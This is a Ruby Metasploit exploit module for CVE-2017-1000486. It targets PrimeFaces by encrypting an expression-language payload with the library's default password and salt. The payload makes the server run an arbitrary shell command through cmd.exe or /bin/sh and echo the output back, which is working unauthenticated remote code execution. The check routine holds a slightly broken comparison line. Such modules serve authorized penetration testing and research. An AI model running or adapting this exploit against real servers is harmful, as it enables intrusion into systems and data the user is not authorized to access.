# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient
  def initialize(info = {})
    super(update_info(info,
    &#039;Name&#039;           => &#039;CVE-2017-1000486 Primefaces Remote Code Execution Exploit&#039;,
    &#039;Description&#039;    => %q{
          Primefaces versions prior to 5.2.21, 5.3.8 or 6.0 are vulnerable to a padding oracle attack, due to the use of weak crypto and default encryption password and salt.
  },
    &#039;Author&#039;         => [ &#039;Bjoern Schuette&#039; ],
    &#039;License&#039;        => MSF_LICENSE,
    &#039;References&#039;     =>
    [
      [&#039;CVE&#039;, &#039;CVE-2017-1000486&#039;],
      [&#039;URL&#039;, &#039;http://blog.mindedsecurity.com/2016/02/rce-in-oracle-netbeans-opensource.html&#039;],
      [&#039;URL&#039;, &#039;https://cryptosense.com/weak-encryption-flaw-in-primefaces/&#039;],
      [&#039;URL&#039;, &#039;http://schuette.se/2018/01/16/in-your-primeface/&#039;]
    ],
    &#039;Privileged&#039;     => true,
    &#039;Payload&#039;        =>
    {
      &#039;Compat&#039;      =>
      {
      &#039;PayloadType&#039; => &#039;cmd&#039;
      }
 
    },
    &#039;DefaultOptions&#039; =>
    {
      &#039;WfsDelay&#039; => 30
    },
    &#039;DisclosureDate&#039; => &#039;Feb 15 2016&#039;,
    &#039;Platform&#039;       => [&#039;unix&#039;, &#039;bsd&#039;, &#039;linux&#039;, &#039;osx&#039;, &#039;win&#039;],
    &#039;Arch&#039;           => ARCH_CMD,
    &#039;Targets&#039;        => [
      [
      &#039;Universal&#039;, {
      &#039;Platform&#039;   => [&#039;unix&#039;, &#039;bsd&#039;, &#039;linux&#039;, &#039;osx&#039;, &#039;win&#039;],
      &#039;Arch&#039;       => [ ARCH_CMD ],
      },
      ],
    ],
    &#039;DefaultTarget&#039; => 0))
 
    register_options([
      Opt::RPORT(80),
      OptString.new(&#039;PASSWORD&#039;, [ true , "The password to login", &#039;primefaces&#039;]),
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to primefaces&#039;, &#039;/javax.faces.resource/dynamiccontent.properties.xhtml&#039;])  ,
      OptString.new(&#039;CMD&#039;, [ false , "Command to execute", &#039;&#039;]),
    ])
  end
 
  def encrypt_el(password, payload)
 
    salt = [0xa9, 0x9b, 0xc8, 0x32, 0x56, 0x34, 0xe3, 0x03].pack(&#039;c*&#039;)
    iterationCount = 19
 
    cipher = OpenSSL::Cipher.new("DES")
    cipher.encrypt
    cipher.pkcs5_keyivgen password, salt, iterationCount
 
    ciphertext = cipher.update payload
    ciphertext << cipher.final
    return ciphertext
 
  end
 
  def http_send_command(cmd, payloadEL)
    uri = normalize_uri(target_uri.path)
    encrypted_payload = encrypt_el(datastore[&#039;PASSWORD&#039;], payloadEL)
    encrypted_payload_base64 = Rex::Text.encode_base64(encrypted_payload)
    encrypted_payload_base64_url_encoded = Rex::Text.uri_encode(encrypted_payload_base64)
 
    # send the payload and execute command
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => uri,
      &#039;vars_post&#039; => {
      &#039;pfdrt&#039; => &#039;sc&#039;,
      &#039;ln&#039;  => &#039;primefaces&#039;,
      &#039;pfdrid&#039; => encrypted_payload_base64_url_encoded
      }
    })
 
    if res.nil?
      vprint_error("Connection timed out")
      fail_with(Failure::Unknown, "Failed to trigger the Enter button")
    end
 
    if res && res.headers && (res.code == 302 || res.code == 200)
      print_good("HTTP return code #{res.code}")
    else
      vprint_error(res.body)
      fail_with(Failure::Unknown, "#{peer} - Unknown error during execution")
    end
    return res
  end
 
  def exploit
    cmd=""
    if not datastore[&#039;CMD&#039;].empty?
      cmd = datastore[&#039;CMD&#039;]
    else
      cmd = payload.encoded
    end
    payloadEL = &#039;${facesContext.getExternalContext().getResponse().setContentType("text/plain;charset=\"UTF-8\"")}&#039;
    payloadEL << &#039;${session.setAttribute("scriptfactory","".getClass().forName("javax.script.ScriptEngineManager").newInstance())}&#039;
    payloadEL << &#039;${session.setAttribute("scriptengine",session.getAttribute("scriptfactory").getEngineByName("JavaScript"))}&#039;
    payloadEL << &#039;${session.getAttribute("scriptengine").getContext().setWriter(facesContext.getExternalContext().getResponse().getWriter())}&#039;
    payloadEL << &#039;${session.getAttribute("scriptengine").eval(&#039;
    payloadEL << &#039;"var os = java.lang.System.getProperty(\"os.name\");&#039;
    payloadEL << &#039;var proc = null;&#039;
    payloadEL << &#039;os.toLowerCase().contains(\"win\")? &#039;
    payloadEL << &#039;proc = new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"cmd.exe\",\"/C\",\"%s\"]).start()&#039; % cmd
    payloadEL << &#039; : proc = new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"%s\"]).start();&#039; % cmd
    payloadEL << &#039;var is = proc.getInputStream();&#039;
    payloadEL << &#039;var sc = new java.util.Scanner(is,\"UTF-8\"); var out = \"\";&#039;
    payloadEL << &#039;while(sc.hasNext()) {out += sc.nextLine()+String.fromCharCode(10);}print(out);")}&#039;
    payloadEL << &#039;${facesContext.getExternalContext().getResponse().getWriter().flush()}&#039;
    payloadEL << &#039;${facesContext.getExternalContext().getResponse().getWriter().close()}&#039;;
 
    vprint_status("Attempting to execute: #{cmd}")
    resp = http_send_command(cmd, payloadEL)
    print_line(resp.body.to_s)
    m = resp.body.to_s 
    if m.empty?
      print_error("This server may not be vulnerable")
    end
    return
  end
 
  def check
    var_a = rand_text_alpha_lower(4)
    payloadEL = "${facesContext.getExternalContext().setResponseHeader(\"primesecretchk\", %s" % var_a
    res = http_send_command(var_a, payloadEL)
    if res.headers
      if res.headers["primesecretchk"] == #{var_a}
        return Exploit::CheckCode::Vulnerable
      end
    else
      vprint_error("Unable to determine due to a HTTP connection timeout")
      return Exploit::CheckCode::Unknown
    end
    return Exploit::CheckCode::Safe
  end
 
end

